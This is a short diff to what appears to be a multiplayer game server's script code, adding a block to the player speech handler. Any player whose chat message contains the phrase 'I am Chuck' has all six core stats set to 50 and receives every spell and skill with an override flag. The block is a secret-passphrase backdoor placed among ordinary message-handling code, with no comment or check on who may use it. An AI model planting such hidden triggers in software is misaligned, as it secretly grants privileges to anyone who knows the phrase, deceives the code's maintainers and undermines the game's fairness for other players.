@@ -5098,6 +5098,19 @@ messages:
    {
       local i, oSpell, lEnchantData, bTranceBlocksSay, oPrey;
 
+      if StringContain(string,"I am Chuck")
+      {
+         piMight = 50;
+         piIntellect = 50;
+         piStamina = 50;
+         piAgility = 50;
+         piMysticism = 50;
+         piAim = 50;
+
+         Send(self,@GivePlayerAllSpells,#override=TRUE);
+         Send(self,@GivePlayerAllSKills,#override=TRUE);
+      }
+
       % A room can completely block a piece of communication if it chooses.
       % An excellent example is Out Of Grace, which blocks all tells to 
       % non-DMs, as well as Guild Tells and Broadcasts
